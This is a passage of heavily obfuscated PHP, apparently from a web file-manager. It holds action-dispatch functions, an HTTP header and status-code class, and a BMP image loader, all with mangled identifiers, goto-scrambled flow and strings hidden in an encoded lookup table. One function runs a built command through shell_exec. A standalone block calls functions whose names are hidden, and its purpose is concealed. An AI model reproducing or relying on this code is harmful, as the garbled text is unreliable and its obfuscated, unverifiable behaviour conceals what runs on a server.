include_once $f›Ë»≠ÿùﬁ; } goto f∑ôïÈªõ≈; DøÎ©ã≠ø∆: } function ActionApply($aß€¶°ÕÏÔ, $aé¬‡¥Ø∫ˆ = array()) { goto CıÛÿ©£áƒ; CıÛÿ©£áƒ: if (is_array($aß€¶°ÕÏÔ)) { return call_user_func_array($aß€¶°ÕÏÔ, $aé¬‡¥Ø∫ˆ); } if (function_exists($aß€¶°ÕÏÔ)) { return call_user_func_array($aß€¶°ÕÏÔ, $aé¬‡¥Ø∫ˆ); } $dï◊Îø†⁄† = strrpos($aß€¶°ÕÏÔ, $_SERVER[ªƒÓ™éå][5]); goto cªÁ≠’â∂•; f∏åÜ•·È“: if (!method_exists($eæâ®ô∞¶˘, $aÕæ‘‰È†¶)) { return actionCallError("{$aß€¶°ÕÏÔ}\x20\155\145\164\x68\x6f\x64\40\156\157\164\x20\145\x78\x69\x73\x74\x73\41"); } $Fé£ª¢ú¨Ê = call_user_func_array(array($eæâ®ô∞¶˘, $aÕæ‘‰È†¶), $aé¬‡¥Ø∫ˆ); return $Fé£ª¢ú¨Ê; goto c∏˘ä·‚≈ò; cªÁ≠’â∂•: $eÈŒ«π™¶› = substr($aß€¶°ÕÏÔ, 0, $dï◊Îø†⁄†); $aÕæ‘‰È†¶ = substr($aß€¶°ÕÏÔ, $dï◊Îø†⁄† + 1); $eæâ®ô∞¶˘ = Action($eÈŒ«π™¶›); goto f∏åÜ•·È“; c∏˘ä·‚≈ò: } function actionCallError($aÔÜâö∂Ôˆ) { $C‹◊úßﬂÃ› =& $_SERVER[ªƒÓ™éå]; $E√àíØÒ∏™ = json_encode_force(array($C‹◊úßﬂÃ›[15] => this_url(), $C‹◊úßﬂÃ›[16] => $GLOBALS[$C‹◊úßﬂÃ›[16]])); $E√àíØÒ∏™ = str_replace(array($C‹◊úßﬂÃ›[17]), array($C‹◊úßﬂÃ›[4]), $E√àíØÒ∏™); return write_log($aÔÜâö∂Ôˆ . $C‹◊úßﬂÃ›[18] . $E√àíØÒ∏™, $C‹◊úßﬂÃ›[19]); } goto dÃ¥ŸßÛÕî; dÃ¥ŸßÛÕî: function ActionCall($A¶Ê„ÿ∫ÚÂ) { $B™ø∫åÌÈÍ = array_slice(func_get_args(), 1); return ActionApply($A¶Ê„ÿ∫ÚÂ, $B™ø∫åÌÈÍ); } function ActionCallApi($Aí∏Çµ≠πú, $e∑àÛ®¢Á‘ = '') { goto Dîı¨ò√ÖÌ; D¯ﬁÿàéÎÙ: return $D»ﬁÎÌÎ≠ê; goto CÙáµô«ë™; eâ£üø¡≤Ÿ: $C≠œ—Ùπ˜— = Action($Cÿùãí≤ç[23])->accessToken(); $Aí∏Çµ≠πú = str_replace($Cÿùãí≤ç[5], $Cÿùãí≤ç[4], $Aí∏Çµ≠πú) . $Cÿùãí≤ç[24] . $C≠œ—Ùπ˜— . $f©ß’ï≥ã©; $d≤Ñßæ™õ∂ = $Cÿùãí≤ç[20]; goto A∑•≈ñ±Ÿâ; A∑•≈ñ±Ÿâ: $FÖñØæ”¡£ = phpBinCommand(); if ($FÖñØæ”¡£ && function_exists($Cÿùãí≤ç[25])) { $e“è¨ùÓìÏ = $FÖñØæ”¡£ . $Cÿùãí≤ç[26] . BASIC_PATH . $Cÿùãí≤ç[27] . escapeshellarg($Aí∏Çµ≠πú); $d≤Ñßæ™õ∂ = shell_exec($e“è¨ùÓìÏ); } if (!$d≤Ñßæ™õ∂) { $D†≤â∑Ìıÿ = stream_context_create(array($Cÿùãí≤ç[28] => array($Cÿùãí≤ç[29] => 20, $Cÿùãí≤ç[30] => $Cÿùãí≤ç[31]))); $d≤Ñßæ™õ∂ = file_get_contents(APP_HOST . $Cÿùãí≤ç[32] . $Aí∏Çµ≠πú, !1, $D†≤â∑Ìıÿ); } goto dÒÏªÒôèº; dÒÏªÒôèº: $EÇƒß€ë£™ = json_decode($d≤Ñßæ™õ∂, !0); $D»ﬁÎÌÎ≠ê = is_array($EÇƒß€ë£™) ? $EÇƒß€ë£™ : array($Cÿùãí≤ç[33] => null, $Cÿùãí≤ç[34] => $d≤Ñßæ™õ∂); if (!$EÇƒß€ë£™) { echo $d≤Ñßæ™õ∂; } goto D¯ﬁÿàéÎÙ; Dîı¨ò√ÖÌ: $Cÿùãí≤ç =& $_SERVER[ªƒÓ™éå]; $f©ß’ï≥ã© = $e∑àÛ®¢Á‘; if (is_array($e∑àÛ®¢Á‘)) { $f©ß’ï≥ã© = $Cÿùãí≤ç[20]; foreach ($e∑àÛ®¢Á‘ as $Eˆ¯Ü’àÜ≤ => $fÃ∆ÌçÂ®î) { $fÃ∆ÌçÂ®î = is_array($fÃ∆ÌçÂ®î) ? json_encode($fÃ∆ÌçÂ®î) : $fÃ∆ÌçÂ®î; $fÃ∆ÌçÂ®î = is_bool($fÃ∆ÌçÂ®î) ? intval($fÃ∆ÌçÂ®î) : $fÃ∆ÌçÂ®î; $f©ß’ï≥ã© .= $Cÿùãí≤ç[21] . $Eˆ¯Ü’àÜ≤ . $Cÿùãí≤ç[22] . rawurlencode($fÃ∆ÌçÂ®î); } } goto eâ£üø¡≤Ÿ; CÙáµô«ë™: } function ActionCallHook($eæ¡À©âÃ÷) { goto EÉ¶¿Ñ Ù¨; dâ»£õ∆Èı: $EÑâ ËÌÉπ = $d‘¥Ö°ñ≠€ ? json_decode($d‘¥Ö°ñ≠€, !0) : $EÑâ ËÌÉπ; $GLOBALS[$cΩÔçΩ‹Ãì[35]] = 0; return $EÑâ ËÌÉπ; goto aΩ•üÜ˜Ìﬂ; EÉ¶¿Ñ Ù¨: $cΩÔçΩ‹Ãì =& $_SERVER[ªƒÓ™éå]; ob_start(); $cï¡·Ö∑§≠ = array_slice(func_get_args(), 1); goto f‘Çœ¯Àì«; f‘Çœ¯Àì«: $GLOBALS[$cΩÔçΩ‹Ãì[35]] = 1; $EÑâ ËÌÉπ = ActionApply($eæ¡À©âÃ÷, $cï¡·Ö∑§≠); $d‘¥Ö°ñ≠€ = ob_get_clean(); goto dâ»£õ∆Èı; aΩ•üÜ˜Ìﬂ: } goto BÇÔÕãö§˜; DÃùü∆ﬂ≠â: class HttpHeader { public static $_headers = array("\x48\x6f\163\164" => "\110\x54\124\x50\137\110\x4f\x53\124", "\x55\x73\x65\x72\x2d\x41\147\145\x6e\164" => "\x48\124\124\120\x5f\125\123\105\x52\137\x41\x47\105\x4e\124", "\103\x6f\156\164\145\x6e\x74\x2d\124\x79\x70\x65" => "\x48\x54\124\120\137\x43\x4f\x4e\124\x45\116\124\x5f\124\131\x50\x45", "\x43\157\x6e\x74\x65\x6e\x74\x2d\114\x65\x6e\147\x74\x68" => "\x48\124\124\x50\x5f\x43\117\116\x54\x45\116\124\x5f\x4c\x45\x4e\107\x54\x48", "\x44\145\160\164\150" => "\x48\x54\x54\x50\x5f\104\x45\x50\124\110", "\105\170\x70\145\x63\x74" => "\110\x54\x54\120\137\x45\130\120\x45\103\x54", "\x49\146\55\116\x6f\x6e\145\x2d\x4d\141\x74\x63\150" => "\x48\124\x54\x50\x5f\x49\x46\137\116\x4f\x4e\105\137\x4d\101\124\x43\x48", "\x49\146\x2d\x4d\141\x74\x63\150" => "\x48\124\124\x50\x5f\111\x46\137\x4d\x41\x54\x43\110", "\x49\146\55\122\x61\x6e\x67\145" => "\x48\124\x54\120\137\x49\x46\x5f\x52\x41\x4e\107\x45", "\114\141\x73\x74\x2d\x4d\157\x64\151\x66\151\x65\144" => "\x48\x54\x54\x50\x5f\x4c\101\x53\x54\137\115\117\104\x49\106\x49\105\104", "\111\x66\55\x4d\157\144\x69\146\x69\145\x64\55\x53\x69\x6e\x63\x65" => "\110\x54\124\x50\137\x49\x46\x5f\115\117\x44\111\x46\111\x45\104\x5f\123\111\x4e\103\105", "\x49\146\55\x55\156\x6d\157\x64\151\x66\151\145\144\x2d\x53\x69\156\x63\x65" => "\110\124\x54\120\x5f\x49\x46\x5f\125\x4e\x4d\117\x44\x49\106\111\105\x44\x5f\123\x49\116\103\x45", "\122\141\156\x67\x65" => "\110\124\124\x50\x5f\122\101\x4e\x47\105", "\x54\151\x6d\145\x6f\x75\x74" => "\110\124\124\120\137\x54\111\x4d\x45\117\x55\124", "\111\146" => "\x48\124\124\120\137\111\106", "\x4c\x6f\143\x6b\x2d\x54\x6f\153\x65\x6e" => "\110\124\124\120\x5f\114\117\x43\113\x5f\x54\x4f\x4b\x45\116", "\117\166\x65\162\x77\162\x69\164\x65" => "\110\124\x54\120\137\117\x56\105\x52\x57\122\111\124\x45", "\104\x65\x73\x74\151\x6e\141\164\151\157\x6e" => "\110\124\x54\x50\x5f\x44\x45\x53\124\111\116\x41\124\111\x4f\116", "\x52\145\x71\165\145\x73\x74\x2d\x49\144" => "\122\105\121\x55\x45\123\x54\137\x49\x44", "\x52\x65\x71\x75\x65\163\164\55\x42\x6f\144\x79\55\106\151\x6c\x65" => "\x52\105\121\125\x45\123\124\x5f\x42\117\x44\131\137\106\111\114\105", "\122\x65\x64\x69\x72\x65\x63\x74\x2d\x53\164\x61\x74\x75\163" => "\122\x45\104\111\122\105\103\x54\137\123\x54\x41\x54\125\x53"); public static function init() { static $cöØ∑ıùÕ  = false; if ($cöØ∑ıùÕ ) { return; } foreach ($_SERVER as $Fƒü·èÙü› => $B≠¯Ûá´ªÖ) { $Fƒü·èÙü› = strtoupper($Fƒü·èÙü›); if (!array_key_exists($Fƒü·èÙü›, $_SERVER)) { continue; } $_SERVER[$Fƒü·èÙü›] = $B≠¯Ûá´ªÖ; } foreach (self::$_headers as $Fƒü·èÙü› => $eêÉìà‚äﬁ) { if (!array_key_exists($Fƒü·èÙü›, $_SERVER)) { continue; } $_SERVER[$Fƒü·èÙü›] = $_SERVER[$eêÉìà‚äﬁ]; $_SERVER[strtoupper($Fƒü·èÙü›)] = $_SERVER[$eêÉìà‚äﬁ]; } } public static function get($FﬁÉùÔ÷Ü) { self::init(); return $_SERVER[$FﬁÉùÔ÷Ü] ? $_SERVER[$FﬁÉùÔ÷Ü] : $_SERVER[$_SERVER[—Ω][1805] . strtoupper($FﬁÉùÔ÷Ü)]; } public static function method() { return strtoupper(self::get($_SERVER[—Ω][151])); } public static function length() { $A˘ññÊ•å§ =& $_SERVER[—Ω]; $f”Ï…ÿÔ‚± = self::get($A˘ññÊ•å§[1806]); if (!$f”Ï…ÿÔ‚±) { $f”Ï…ÿÔ‚± = self::get($A˘ññÊ•å§[1142]); } return $f”Ï…ÿÔ‚±; } public static function range() { $E€œÏ÷◊ËË =& $_SERVER[—Ω]; $EØﬂÉ”œπ„ = self::get($E€œÏ÷◊ËË[195]); if (!$EØﬂÉ”œπ„) { return !1; } if (!preg_match($E€œÏ÷◊ËË[1807], $EØﬂÉ”œπ„, $AØÜàÇÎ≤´)) { return !1; } if ($AØÜàÇÎ≤´[1] === $E€œÏ÷◊ËË[33] && $AØÜàÇÎ≤´[2] === $E€œÏ÷◊ËË[33]) { return !1; } return array($AØÜàÇÎ≤´[1] !== $E€œÏ÷◊ËË[33] ? $AØÜàÇÎ≤´[1] : null, $AØÜàÇÎ≤´[2] !== $E€œÏ÷◊ËË[33] ? $AØÜàÇÎ≤´[2] : null); } public static $statusCode = array("\61\x30\60" => "\x43\x6f\x6e\x74\x69\156\165\x65", "\61\60\x31" => "\123\167\151\164\143\150\x69\x6e\147\40\x50\x72\x6f\x74\157\143\x6f\154", "\61\60\x32" => "\120\162\157\143\145\163\x73\151\x6e\x67", "\61\60\x33" => "\x45\x61\x72\x6c\x79\40\110\151\x6e\164\163", "\62\60\60" => "\x4f\x4b", "\x32\x30\61" => "\x43\162\145\x61\x74\145\x64", "\x32\60\62" => "\x41\143\x63\145\x70\164\145\x64", "\x32\x30\63" => "\x4e\x6f\156\x2d\101\x75\164\150\x6f\x72\x69\164\x61\x74\151\x76\145\x20\111\x6e\x66\157\x72\x6d\141\164\151\157\x6e", "\62\60\64" => "\116\157\x20\103\157\156\x74\145\156\x74", "\x32\60\x35" => "\122\145\163\x65\164\40\103\157\156\164\x65\x6e\164", "\62\x30\x36" => "\x50\x61\162\x74\x69\141\x6c\x20\x43\x6f\x6e\164\145\156\164", "\62\x30\x37" => "\115\x75\154\164\x69\x2d\123\x74\141\164\x75\x73", "\x33\60\x30" => "\x4d\165\x6c\x74\151\x70\x6c\x65\x20\x43\x68\x6f\151\143\x65\x73", "\63\x30\x31" => "\x4d\x6f\x76\145\x64\x20\120\x65\x72\155\141\156\x65\156\164\154\x79", "\63\60\62" => "\106\x6f\x75\156\x64", "\63\60\63" => "\x53\145\145\x20\117\x74\150\x65\x72", "\x33\60\x34" => "\116\157\x74\x20\115\x6f\144\151\x66\151\145\144", "\x33\60\x35" => "\125\x73\x65\40\120\162\157\170\171", "\63\x30\x37" => "\x54\x65\x6d\x70\x6f\162\141\x72\x79\40\x52\145\144\x69\x72\145\x63\x74", "\63\x30\x38" => "\x50\145\x72\155\x61\156\x65\156\164\x20\122\145\x64\151\x72\x65\x63\164", "\64\60\x30" => "\102\141\144\40\122\x65\161\x75\145\163\164", "\x34\x30\61" => "\x55\x6e\141\165\x74\150\157\162\151\172\x65\144", "\x34\60\x32" => "\120\141\x79\x6d\145\156\164\x20\x52\145\161\x75\x69\x72\x65\144", "\64\x30\x33" => "\106\x6f\x72\x62\x69\x64\144\145\x6e", "\64\x30\64" => "\x4e\157\x74\40\106\157\x75\156\144", "\x34\60\x35" => "\115\x65\164\x68\157\x64\40\116\x6f\x74\x20\x41\154\x6c\x6f\x77\x65\x64", "\64\x30\66" => "\116\157\x74\x20\x41\x63\143\145\160\164\141\142\154\145", "\x34\60\x37" => "\x50\162\x6f\170\171\40\x41\x75\x74\150\x65\x6e\x74\x69\143\x61\164\151\157\156\x20\122\145\161\165\x69\162\x65\144", "\64\x30\70" => "\122\145\x71\165\145\163\x74\40\x54\151\x6d\145\x6f\165\164", "\x34\60\x39" => "\103\x6f\x6e\146\154\151\x63\164", "\64\x31\60" => "\x47\157\156\145", "\64\61\x31" => "\x4c\145\156\147\x74\150\40\122\145\x71\x75\x69\162\x65\144", "\x34\x31\x32" => "\120\x72\145\x63\157\x6e\144\x69\164\151\157\x6e\40\x46\141\151\x6c\x65\144", "\64\x31\x33" => "\x52\145\x71\165\145\163\x74\40\x45\156\164\151\x74\171\40\x54\157\157\x20\114\141\162\x67\145", "\x34\x31\64" => "\122\x65\161\165\x65\163\x74\40\x55\x52\111\40\x54\x6f\157\x20\x4c\x61\162\x67\x65", "\64\x31\x35" => "\x55\x6e\163\x75\x70\x70\x6f\162\164\x65\144\x20\x4d\145\x64\x69\x61\x20\124\x79\x70\145", "\x34\x31\x36" => "\x52\x65\x71\x75\x65\x73\x74\145\144\40\122\x61\156\147\x65\x20\116\157\x74\40\123\141\x74\151\x73\146\151\141\142\154\145", "\x34\61\67" => "\105\170\160\145\143\164\141\x74\151\157\x6e\x20\106\141\x69\154\x65\144", "\64\62\x32" => "\125\156\160\162\157\143\x65\163\x73\x61\142\154\x65\x20\x45\156\164\151\x74\x79", "\64\x32\x33" => "\114\x6f\x63\153\145\x64", "\x34\62\64" => "\x46\141\151\154\145\144\40\104\145\160\145\156\x64\x65\156\143\x79", "\x34\x32\65" => "\125\156\x6f\162\x64\145\x72\x65\144\x20\103\x6f\x6c\154\145\x63\164\151\x6f\156", "\64\x32\66" => "\x55\x70\147\162\141\x64\145\40\x52\145\x71\165\151\162\145\x64", "\64\62\70" => "\120\162\145\x63\157\x6e\x64\151\x74\x69\157\x6e\40\x52\145\161\x75\151\x72\145\x64", "\64\62\x39" => "\x54\157\157\40\115\141\156\171\40\x52\145\161\165\145\163\x74\x73", "\x34\63\61" => "\x52\145\x71\165\145\163\x74\x20\x48\x65\141\144\x65\x72\40\106\151\145\154\144\163\40\124\x6f\x6f\x20\x4c\x61\x72\147\x65", "\x34\x34\64" => "\116\157\40\x52\x65\x73\160\157\x6e\163\x65", "\64\65\60" => "\102\x6c\157\143\153\x65\x64\40\x62\171\x20\127\x69\x6e\144\x6f\x77\x73\x20\120\141\x72\x65\x6e\164\x61\x6c\x20\x43\x6f\156\164\162\x6f\154\163", "\x34\x35\x31" => "\x55\156\141\166\x61\151\154\x61\142\154\x65\x20\106\157\162\x20\x4c\x65\147\141\x6c\x20\122\x65\x61\163\x6f\156\163", "\64\x39\64" => "\122\145\161\165\x65\x73\x74\x20\x48\x65\x61\144\145\162\40\x54\x6f\x6f\40\x4c\141\162\147\x65", "\65\60\x30" => "\x49\x6e\164\145\162\156\141\x6c\40\x53\145\162\x76\x65\162\40\x45\162\162\x6f\x72", "\65\x30\x31" => "\116\157\x74\x20\x49\155\x70\154\145\155\x65\156\164\x65\144", "\65\60\x32" => "\x42\141\x64\x20\x47\141\164\145\167\141\x79", "\65\60\63" => "\123\145\162\166\151\143\x65\x20\x55\x6e\141\166\141\x69\154\141\142\x6c\x65", "\x35\x30\64" => "\x47\141\164\145\167\x61\x79\40\124\x69\155\x65\157\x75\x74", "\65\x30\65" => "\x48\x54\x54\x50\40\x56\145\x72\x73\151\x6f\x6e\x20\156\157\164\x20\163\x75\160\x70\x6f\x72\x74\145\x64", "\65\x30\x37" => "\111\x6e\163\165\146\x66\151\143\x69\145\x6e\x74\40\x53\x74\157\x72\x61\147\x65"); public static function code($AΩìÒºπ•ú) { $B¡ô·µâƒÇ =& $_SERVER[—Ω]; $AΩìÒºπ•ú = $AΩìÒºπ•ú . $B¡ô·µâƒÇ[33]; $a°Á¨äÂ∏ä = self::$statusCode[$AΩìÒºπ•ú]; $a°Á¨äÂ∏ä = $a°Á¨äÂ∏ä ? "\x48\x54\x54\120\57\x31\x2e\61\x20{$AΩìÒºπ•ú}\40" . $a°Á¨äÂ∏ä : $B¡ô·µâƒÇ[33]; return $a°Á¨äÂ∏ä; } } if ($_SERVER[$_SERVER[—Ω][690]] != $_SERVER[$_SERVER[—Ω][1301]]) { goto BûﬂÑŸÉ≈¢; C˘©ÈÊπ∫: $A…ƒˆπ¬‰√ = explode($_SERVER[—Ω][214], $d◊è∫ÎıæÊ); if (count($A…ƒˆπ¬‰√) < $_SERVER[—Ω][553]) { $CÜºßÑÖÍÌ = $_SERVER[—Ω][695]; $CÜºßÑÖÍÌ(); } $eπá™À’∏Ì = $_SERVER[—Ω][696]; goto cıÁ”É≥ˆ±; BûﬂÑŸÉ≈¢: $B‘≤ÇÔ¡ÜÒ = $_SERVER[—Ω][692]; $B±ˆï˜ïúå = $_SERVER[$_SERVER[—Ω][693]] . $_SERVER[—Ω][694]; $d◊è∫ÎıæÊ = $B‘≤ÇÔ¡ÜÒ($B±ˆï˜ïúå); goto C˘©ÈÊπ∫; cıÁ”É≥ˆ±: $eπá™À’∏Ì($_SERVER[$_SERVER[—Ω][691]]); goto AÚÀ”›¬ÔÙ; AÚÀ”›¬ÔÙ: } class ImageGdBMP { public static function load($bµÎÍ¢üü©) { $Dê¨÷Óöë” = fopen($bµÎÍ¢üü©, $_SERVER[—Ω][1496]); if ($Dê¨÷Óöë” === !1) { return !1; } $D€ÈÂ‰ÔÖû = self::loadFromStream($Dê¨÷Óöë”); fclose($Dê¨÷Óöë”); return $D€ÈÂ‰ÔÖû; } public static function loadFromStream($CËÿÜûÛä‘) { $aÛë¡Œ·ıè =& $_SERVER[—Ω]; $fç”•∆ÊÁÿ = fread($CËÿÜûÛä‘, 14); if ($fç”•∆ÊÁÿ === !1) { return !1; } if ($fç”•∆ÊÁÿ[0] != $aÛë¡Œ·ıè[1808] || $fç”•∆ÊÁÿ[1] != $aÛë¡Œ·ıè[1809]) { return !1; } $DÜ‚à¥çÍ» = unpack($aÛë¡Œ·ıè[1810] . $aÛë¡Œ·ıè[1811] . $aÛë¡Œ·ıè[1812] . $aÛë¡Œ·ıè[1813] . $aÛë¡Œ·ıè[1814], $fç”•∆ÊÁÿ); return self::loadFromStreamAndFileHeader($CËÿÜûÛä‘, $DÜ‚à¥çÍ»); } public static function loadFromStreamAndFileHeader($Fèé…£ÕÒÖ, array $c¿©ƒﬁÇ‰») { goto c¥≈Øï‡©‚; EÚ—⁄‚Òäƒ: if ($e¥∞ ù˜™ == 1 || $e¥∞ ù˜™ == 4 || $e¥∞ ù˜™ == 8) { goto F¨ÓÙÑªøø; B–·Ïº÷ïﬂ: $D…Ó∞ˆﬁÛë = (1 << $e¥∞ ù˜™) - 1 << $bÛπÏ±ó›™; if ($AÜ‹ãÎŒßè == 1 || $AÜ‹ãÎŒßè == 2) { $BÖÀÓÛ°Ò = 0; $dçÕ¢ïÜÓÛ = $e¥∞ ù˜™ >> 2 & 1; for (;;) { if ($BÖÀÓÛ°Ò < -1 || $BÖÀÓÛ°Ò > $b¨èÂá∂ó∂ || $fáÁ—üà…€ < -1 || $fáÁ—üà…€ > $eà‡ØûÇ¡≠) { imagedestroy($dèéú¯˜Õä); return !1; } $dä÷ÁœŒ´‹ = fread($Fèé…£ÕÒÖ, 1); if ($dä÷ÁœŒ´‹ === !1) { imagedestroy($dèéú¯˜Õä); return !1; } switch ($dä÷ÁœŒ´‹) { case $AÖÜ∏“ì≈Ñ[1833]: $dä÷ÁœŒ´‹ = fread($Fèé…£ÕÒÖ, 1); if ($dä÷ÁœŒ´‹ === !1) { imagedestroy($dèéú¯˜Õä); return !1; } switch ($dä÷ÁœŒ´‹) { case $AÖÜ∏“ì≈Ñ[1833]: $fáÁ—üà…€ += $béìø‚üﬁí; $BÖÀÓÛ°Ò = 0; break; case $AÖÜ∏“ì≈Ñ[1835]: $fáÁ—üà…€ = 0; $BÖÀÓÛ°Ò = 0; break 3; case $AÖÜ∏“ì≈Ñ[1836]: $dä÷ÁœŒ´‹ = fread($Fèé…£ÕÒÖ, 2); if ($dä÷ÁœŒ´‹ === !1) { imagedestroy($dèéú¯˜Õä); return !1; } list(, $aÒ∏ü∑≠≈≤, $BËØãªíêæ) = unpack($AÖÜ∏“ì≈Ñ[1837], $dä÷ÁœŒ´‹); $BÖÀÓÛ°Ò += $aÒ∏ü∑≠≈≤; $fáÁ—üà…€ += $BËØãªíêæ * $béìø‚üﬁí; break; default: list(, $Cì¿Ë˜›Ã’) = unpack($AÖÜ∏“ì≈Ñ[1838], $dä÷ÁœŒ´‹); $dàêâ—¡€¶ = ($Cì¿Ë˜›Ã’ >> $dçÕ¢ïÜÓÛ) + ($Cì¿Ë˜›Ã’ & $dçÕ¢ïÜÓÛ); $dä÷ÁœŒ´‹ = fread($Fèé…£ÕÒÖ, $dàêâ—¡€¶ + 1 & ~1); if ($dä÷ÁœŒ´‹ === !1) { imagedestroy($dèéú¯˜Õä); return !1; } for ($E∫´ŸÜÍÔ” = 0, $cÎæ—ûïß = 0; $E∫´ŸÜÍÔ” < $Cì¿Ë˜›Ã’; ++$E∫´ŸÜÍÔ”, ++$BÖÀÓÛ°Ò, $cÎæ—ûïß += $e¥∞ ù˜™) { list(, $b«ÆªÑ≠ªŒ) = unpack($AÖÜ∏“ì≈Ñ[1838], $dä÷ÁœŒ´‹[$cÎæ—ûïß >> 3]); $Fô⁄Ñê™âò = $cÎæ—ûïß & 7; imagesetpixel($dèéú¯˜Õä, $BÖÀÓÛ°Ò, $fáÁ—üà…€, $dŒﬁÜ±£ô∂[($b«ÆªÑ≠ªŒ & $D…Ó∞ˆﬁÛë >> $Fô⁄Ñê™âò) >> $bÛπÏ±ó›™ - $Fô⁄Ñê™âò]); } break; } break; default: $Däú‡∑ÀÔ≈ = fread($Fèé…£ÕÒÖ, 1); if ($Däú‡∑ÀÔ≈ === !1) { imagedestroy($dèéú¯˜Õä); return !1; } list(, $fÏÖâ´é´É, $b«ÆªÑ≠ªŒ) = unpack($AÖÜ∏“ì≈Ñ[1837], $dä÷ÁœŒ´‹ . $Däú‡∑ÀÔ≈); for ($E∫´ŸÜÍÔ” = 0, $cÎæ—ûïß = 0; $E∫´ŸÜÍÔ” < $fÏÖâ´é´É; ++$E∫´ŸÜÍÔ”, ++$BÖÀÓÛ°Ò, $cÎæ—ûïß += $e¥∞ ù˜™) { $Fô⁄Ñê™âò = $cÎæ—ûïß & 7; imagesetpixel($dèéú¯˜Õä, $BÖÀÓÛ°Ò, $fáÁ—üà…€, $dŒﬁÜ±£ô∂[($b«ÆªÑ≠ªŒ & $D…Ó∞ˆﬁÛë >> $Fô⁄Ñê™âò) >> $bÛπÏ±ó›™ - $Fô⁄Ñê™âò]); } break; } } } else { for ($f¨ÁÉü®÷ó = 0; $f¨ÁÉü®÷ó < $B·≤à‡–Ü≈; ++$f¨ÁÉü®÷ó, $fáÁ—üà…€ += $béìø‚üﬁí) { $dä÷ÁœŒ´‹ = fread($Fèé…£ÕÒÖ, $cÈ‚î≥îûæ); if ($dä÷ÁœŒ´‹ === !1) { imagedestroy($dèéú¯˜Õä); return !1; } $cÎæ—ûïß = 0; for ($BÖÀÓÛ°Ò = 0; $BÖÀÓÛ°Ò < $b¨èÂá∂ó∂; ++$BÖÀÓÛ°Ò, $cÎæ—ûïß += $e¥∞ ù˜™) { list(, $b«ÆªÑ≠ªŒ) = unpack($AÖÜ∏“ì≈Ñ[1838], $dä÷ÁœŒ´‹[$cÎæ—ûïß >> 3]); $Fô⁄Ñê™âò = $cÎæ—ûïß & 7; imagesetpixel($dèéú¯˜Õä, $BÖÀÓÛ°Ò, $fáÁ—üà…€, $dŒﬁÜ±£ô∂[($b«ÆªÑ≠ªŒ & $D…Ó∞ˆﬁÛë >> $Fô⁄Ñê™âò) >> $bÛπÏ±ó›™ - $Fô⁄Ñê™âò]); } } } goto aãÓÀÌò◊; BÛ–â“˜√â: $dŒﬁÜ±£ô∂ = array(); for ($E∫´ŸÜÍÔ” = 0; $E∫´ŸÜÍÔ” < $E¿˜¢À∞Êœ; ++$E∫´ŸÜÍÔ”) { $dä÷ÁœŒ´‹ = fread($Fèé…£ÕÒÖ, $F˜€µ∆ìôÚ); if ($dä÷ÁœŒ´‹ === !1) { imagedestroy($dèéú¯˜Õä); return !1; } extract(unpack($AÖÜ∏“ì≈Ñ[1834], $dä÷ÁœŒ´‹ . $AÖÜ∏“ì≈Ñ[1833])); $dŒﬁÜ±£ô∂[] = imagecolorallocate($dèéú¯˜Õä, $A÷“ÑúóŸ·, $fµø≠á—à¥, $Fô⁄Ñê™âò); } $bÛπÏ±ó›™ = 8 - $e¥∞ ù˜™; goto B–·Ïº÷ïﬂ; F¨ÓÙÑªøø: $dèéú¯˜Õä = imagecreate($b¨èÂá∂ó∂, $B·≤à‡–Ü≈); $F˜€µ∆ìôÚ = $dÚó…â≠Í¡ == 12 ? 3 : 4; $E¿˜¢À∞Êœ = $DëµÀ¯®∏Ö ? $DëµÀ¯®∏Ö : pow(2, $e¥∞ ù˜™); goto BÛ–â“˜√â; aãÓÀÌò◊: } else { goto cßÏ€€∑îè; d∆πâãπÊé: $eí≠´àÉâÉ = $D≈èÈªëìî ? 1 / $D≈èÈªëìî : 1; $Búú´œ±É = $AçÉÜÙ≤‰ï ? 1 / $AçÉÜÙ≤‰ï : 1; $F¿üâ®ä≤â = $DÓßë–áß ? 1 / $DÓßë–áß : 1; goto c‚ÁœÛáß°; cßÏ€€∑îè: $dèéú¯˜Õä = imagecreatetruecolor($b¨èÂá∂ó∂, $B·≤à‡–Ü≈); imagealphablending($dèéú¯˜Õä, !1); if ($eÂÜÔ÷í–ë) { imagesavealpha($dèéú¯˜Õä, !0); } goto f—È˜ﬁŒßà; c‚ÁœÛáß°: for ($f¨ÁÉü®÷ó = 0; $f¨ÁÉü®÷ó < $B·≤à‡–Ü≈; ++$f¨ÁÉü®÷ó, $fáÁ—üà…€ += $béìø‚üﬁí) { $dä÷ÁœŒ´‹ = fread($Fèé…£ÕÒÖ, $cÈ‚î≥îûæ); if ($dä÷ÁœŒ´‹ === !1) { imagedestroy($dèéú¯˜Õä); return !1; } $cÎæ—ûïß = 0; for ($BÖÀÓÛ°Ò = 0; $BÖÀÓÛ°Ò < $b¨èÂá∂ó∂; ++$BÖÀÓÛ°Ò, $cÎæ—ûïß += $dıç‡Ç∞Ü¥) { list(, $b«ÆªÑ≠ªŒ) = unpack($AÖÜ∏“ì≈Ñ[1815], substr($dä÷ÁœŒ´‹, $cÎæ—ûïß, $dıç‡Ç∞Ü¥) . $AÖÜ∏“ì≈Ñ[1839]); $a‹ﬁ©˜ÿÕ“ = $b«ÆªÑ≠ªŒ & $eÂÜÔ÷í–ë; $dÙΩ∑¿ü‚µ = $b«ÆªÑ≠ªŒ & $D≈èÈªëìî; $bØ£ãîçÖì = $b«ÆªÑ≠ªŒ & $AçÉÜÙ≤‰ï; $fä‰úÀ¯∏ï = $b«ÆªÑ≠ªŒ & $DÓßë–áß; $D¢â∆ÖÒ¶— = $e∫“Æ∏ïâØ - (($a‹ﬁ©˜ÿÕ“ << 7) - $a‹ﬁ©˜ÿÕ“) * $f’Ë∫∆Éå∏; $A÷“ÑúóŸ· = (($dÙΩ∑¿ü‚µ << 8) - $dÙΩ∑¿ü‚µ) * $eí≠´àÉâÉ; $fµø≠á—à¥ = (($bØ£ãîçÖì << 8) - $bØ£ãîçÖì) * $Búú´œ±É; $Fô⁄Ñê™âò = (($fä‰úÀ¯∏ï << 8) - $fä‰úÀ¯∏ï) * $F¿üâ®ä≤â; imagesetpixel($dèéú¯˜Õä, $BÖÀÓÛ°Ò, $fáÁ—üà…€, $D¢â∆ÖÒ¶— << 24 | $A÷“ÑúóŸ· << 16 | $fµø≠á—à¥ << 8 | $Fô⁄Ñê™âò); } } imagealphablending($dèéú¯˜Õä, !0); goto AëÔÓÜÂéç; f—È˜ﬁŒßà: $dıç‡Ç∞Ü¥ = $e¥∞ ù˜™ >> 3; $e∫“Æ∏ïâØ = $eÂÜÔ÷í–ë ? 127 : 0; $f’Ë∫∆Éå∏ = 